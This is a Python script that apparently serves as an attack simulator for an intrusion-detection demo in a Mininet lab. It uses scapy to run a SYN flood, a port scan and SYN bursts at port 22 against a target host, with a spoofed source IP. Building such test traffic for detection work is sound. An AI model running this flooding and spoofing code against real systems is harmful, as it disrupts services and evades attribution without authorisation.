"""
attacker.py — Attack Simulator (Testing / Demo)
=================================================
Simulates three attack types from any attacker host against h2.

Run from inside Mininet on any attacker host:
    mininet> h3 python3 attacker.py --attack ddos   --src 10.0.0.3
    mininet> h4 python3 attacker.py --attack portscan --src 10.0.0.4
    mininet> h5 python3 attacker.py --attack brute  --src 10.0.0.5
    mininet> h3 python3 attacker.py --attack mixed  --src 10.0.0.3

Or with custom target:
    mininet> h3 python3 attacker.py --attack ddos --src 10.0.0.3 --target 10.0.0.2 --count 2000

--src is the IP of the host running this script (used as packet source IP).
If --src is omitted, the script reads HOST_IPS from topology_state.json
and defaults to the first attacker IP found (h3).
"""

import json
import os
import time
import argparse
import random
from scapy.all import send, sendp, IP, TCP, Ether, RandShort, conf
import subprocess

# ── Resolve default IPs from topology_state.json ─────────────────────────────
_TOPO_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          'topology_state.json')

def _load_topo():
    if os.path.exists(_TOPO_FILE):
        with open(_TOPO_FILE, 'r', newline='') as f:
            return json.loads(f.read().replace('\r', ''))
    return {}

_topo         = _load_topo()
_host_ips     = _topo.get('host_ips', {'h1': '10.0.0.1', 'h2': '10.0.0.2', 'h3': '10.0.0.3'})
DEFAULT_TARGET = _host_ips.get('h2', '10.0.0.2')

_attacker_ips = [ip for h, ip in _host_ips.items() if h not in ('h1', 'h2')]
DEFAULT_SRC   = _attacker_ips[0] if _attacker_ips else '10.0.0.3'


def _get_iface():
    """Get the active network interface (eth0 in WSL2)."""
    try:
        result = subprocess.run(['ip', 'route', 'show', 'default'],
                                capture_output=True, text=True)
        for part in result.stdout.split():
            if part not in ('default', 'via', 'dev', 'proto', 'metric', 'src'):
                # First non-keyword after 'dev' is the interface
                pass
        # Simpler: just find 'dev X'
        parts = result.stdout.split()
        if 'dev' in parts:
            return parts[parts.index('dev') + 1]
    except Exception:
        pass
    return 'eth0'


def _send(target_ip, src_ip, dport, flags='S', count=1, delay=0):
    """
    Send TCP packets using L3 send() — fast and works in WSL2 without Mininet.
    Spoofs src_ip in the IP header so the sniffer sees the attacker IP.
    """
    for _ in range(count):
        pkt = IP(dst=target_ip, src=src_ip) / TCP(
            sport=RandShort(), dport=dport, flags=flags,
            seq=random.randint(1000, 99999)
        )
        send(pkt, verbose=0)
        if delay > 0:
            time.sleep(delay)


# ── Attack functions ──────────────────────────────────────────────────────────

def ddos_syn_flood(target_ip, src_ip, count=2000, delay=0.0):
    print(f'[Attack] SYN Flood {src_ip} → {target_ip} | {count} packets')
    start = time.time()
    for _ in range(count):
        _send(target_ip, src_ip, dport=80, flags='S', delay=delay)
    elapsed = time.time() - start
    print(f'[Attack] Done: {count} packets in {elapsed:.2f}s ({count/elapsed:.0f} pkt/s)')


def port_scan(target_ip, src_ip, start_port=1, end_port=1024, delay=0.01):
    print(f'[Attack] Port Scan {src_ip} → {target_ip} | ports {start_port}–{end_port}')
    start = time.time()
    for port in range(start_port, end_port + 1):
        _send(target_ip, src_ip, dport=port, flags='S', delay=delay)
        if port % 100 == 0:
            print(f'[Attack] Scanned up to port {port}...')
    elapsed = time.time() - start
    print(f'[Attack] Done: {end_port - start_port + 1} ports in {elapsed:.2f}s')


def brute_force(target_ip, src_ip, target_port=22, count=500, delay=0.005):
    print(f'[Attack] Brute Force {src_ip} → {target_ip}:{target_port} | {count} attempts')
    start = time.time()
    for _ in range(count):
        _send(target_ip, src_ip, dport=target_port, flags='S', delay=delay)
    elapsed = time.time() - start
    print(f'[Attack] Done: {count} attempts in {elapsed:.2f}s')


def mixed_attack(target_ip, src_ip):
    """
    Full demo sequence: Normal → Port Scan → SYN Flood → Brute Force.
    Shows all three detection methods in one run.
    """
    print(f'=== DEMO: Mixed Attack Sequence from {src_ip} ===\n')

    print('[Phase 1] Normal traffic (10 packets)...')
    for _ in range(10):
        send(IP(dst=target_ip, src=src_ip) / TCP(dport=80, flags='S'), verbose=0)
        time.sleep(0.5)
    print('[Phase 1] Done.\n')
    time.sleep(3)

    print('[Phase 2] Port Scan (ports 1–100)...')
    port_scan(target_ip, src_ip, 1, 100, delay=0.02)
    print('[Phase 2] Done.\n')
    time.sleep(3)

    print('[Phase 3] SYN Flood (500 packets)...')
    ddos_syn_flood(target_ip, src_ip, count=500, delay=0.002)
    print('[Phase 3] Done.\n')
    time.sleep(3)

    print('[Phase 4] Brute Force (200 attempts on port 22)...')
    brute_force(target_ip, src_ip, target_port=22, count=200)
    print('[Phase 4] Done.\n')

    print('=== Attack sequence complete ===')


# ── CLI entry point ───────────────────────────────────────────────────────────

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Attack Simulator')
    parser.add_argument('--attack', choices=['ddos', 'portscan', 'brute', 'mixed'],
                        default='mixed')
    parser.add_argument('--target', default=DEFAULT_TARGET,
                        help='Target IP (default: h2 from topology)')
    parser.add_argument('--src',    default=DEFAULT_SRC,
                        help='Source IP — set to this host\'s IP (default: first attacker)')
    parser.add_argument('--count',  type=int, default=1000)
    parser.add_argument('--port',   type=int, default=80)
    args = parser.parse_args()

    print(f'Attacker: {args.src} | Target: {args.target} | Attack: {args.attack}\n')

    if args.attack == 'ddos':
        ddos_syn_flood(args.target, args.src, count=args.count)
    elif args.attack == 'portscan':
        port_scan(args.target, args.src)
    elif args.attack == 'brute':
        brute_force(args.target, args.src, target_port=args.port, count=args.count)
    elif args.attack == 'mixed':
        mixed_attack(args.target, args.src)
